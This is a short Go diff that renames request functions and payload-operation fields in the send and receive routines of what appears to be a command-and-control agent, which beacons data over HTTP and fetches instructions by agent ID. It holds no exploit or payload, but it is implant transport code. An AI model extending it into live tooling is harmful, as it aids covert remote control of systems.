@@ -6,7 +6,7 @@ import (
 )
 
 func send(agentId *string, profile *profiles.Profile, data *string) (err error) {
-	reqBody, err := profiles.OperateData(&profile.Respond.Payload.Operations, data, true)
+	reqBody, err := profiles.OperateData(&profile.Respond.Payload.Request.Operations, data, true)
 	if err != nil {
 		return err
 	}
@@ -17,7 +17,7 @@ func send(agentId *string, profile *profiles.Profile, data *string) (err error) 
 
 	client := profile.GetHttpClient()
 
-	req, err := profile.GetRequestOutcall(&processedAgentId, []byte(reqBody))
+	req, err := profile.GetRequestSend(&processedAgentId, []byte(reqBody))
 	if err != nil {
 		return err
 	}
@@ -43,7 +43,7 @@ func receive(agentId *string, profile *profiles.Profile) (instruction string, er
 
 	client := profile.GetHttpClient()
 
-	req, err := profile.GetRequestIncall(&processedAgentId, nil)
+	req, err := profile.GetRequestReceive(&processedAgentId, nil)
 	if err != nil {
 		return "", err
 	}
@@ -69,5 +69,5 @@ func receive(agentId *string, profile *profiles.Profile) (instruction string, er
 
 	bodyStr := string(body)
 
-	return profiles.OperateData(&profile.Receive.Payload.Operations, &bodyStr, false)
+	return profiles.OperateData(&profile.Receive.Payload.Response.Operations, &bodyStr, false)
 }
